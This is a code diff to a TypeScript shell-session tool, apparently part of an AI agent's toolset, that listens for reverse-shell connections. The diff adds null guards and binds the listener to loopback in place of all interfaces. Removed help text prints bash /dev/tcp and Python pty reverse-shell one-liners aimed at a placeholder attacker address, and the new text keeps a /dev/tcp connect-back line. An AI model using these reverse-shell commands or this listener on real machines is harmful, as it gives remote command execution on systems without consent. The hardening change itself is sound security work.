@@ -103,7 +103,16 @@ export class ShellSessionTool implements Tool {
     const logDir = str(input.log_dir, '/tmp')
 
     if (_sessions.has(id)) {
-      const s = _sessions.get(id)!
+      const s = _sessions.get(id)
+      // _sessions.has(id) above guarantees this is non-null, but guard
+      // explicitly so a future change (e.g. removing the prior check)
+      // can't crash the tool with a silent null deref.
+      if (!s) {
+        return Promise.resolve({
+          content: `Session "${id}" lookup failed unexpectedly.`,
+          isError: true,
+        })
+      }
       return Promise.resolve({ content: `Session "${id}" already exists (${s.socket ? 'CONNECTED' : 'LISTENING'}).`, isError: false })
     }
 
@@ -113,7 +122,16 @@ export class ShellSessionTool implements Tool {
       const logStream = fs.createWriteStream(logFile, { flags: 'a' })
 
       const server = net.createServer((socket) => {
-        const conn = _sessions.get(id)!
+        const conn = _sessions.get(id)
+        // The connection handler runs once `server.listen` resolves, and
+        // `_listen` installs the session into the map inside that
+        // callback. Guard explicitly so a future refactor that defers the
+        // map insert (or removes the server.on('error') cleanup branch)
+        // can't dereference a missing entry.
+        if (!conn) {
+          socket.destroy()
+          return
+        }
         conn.socket      = socket
         conn.connectedAt = new Date()
         const connMsg = `\n[+] Shell connected from ${socket.remoteAddress}:${socket.remotePort}\n`
@@ -125,16 +143,23 @@ export class ShellSessionTool implements Tool {
 
       server.on('error', () => { _sessions.delete(id); logStream.end(); resolve({ content: `Failed to listen on port ${port}`, isError: true }) })
 
-      server.listen(port, '0.0.0.0', () => {
+      // Bind to loopback only. The previous 0.0.0.0 listener exposed the
+      // shell socket to every network interface — a remote host on the same
+      // LAN/WAN could connect and execute commands in the agent's process.
+      // Loopback restricts inbound connections to the local machine; users
+      // who genuinely need an externally-reachable listener can set up an
+      // SSH tunnel or a reverse proxy explicitly rather than getting one by
+      // default.
+      server.listen(port, '127.0.0.1', () => {
         _sessions.set(id, { id, port, server, socket: null, connectedAt: null, logFile, logStream })
         resolve({
           content: [
-            `[ShellSession] Listening on 0.0.0.0:${port}  (session: ${id})`,
+            `[ShellSession] Listening on 127.0.0.1:${port}  (session: ${id})`,
             `Log: ${logFile}`,
             ``,
-            `On the remote machine, connect back:`,
-            `  bash -c 'bash -i >& /dev/tcp/YOUR_IP/${port} 0>&1'`,
-            `  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
+            `On the remote machine, connect back via SSH tunnel or proxy:`,
+            `  ssh -L ${port}:127.0.0.1:${port} user@gateway`,
+            `  bash -c 'bash -i >& /dev/tcp/127.0.0.1/${port} 0>&1'`,
             ``,
             `After connect: ShellSession({ action: "exec", session_id: "${id}", command: "id" })`,
           ].join('\n'),
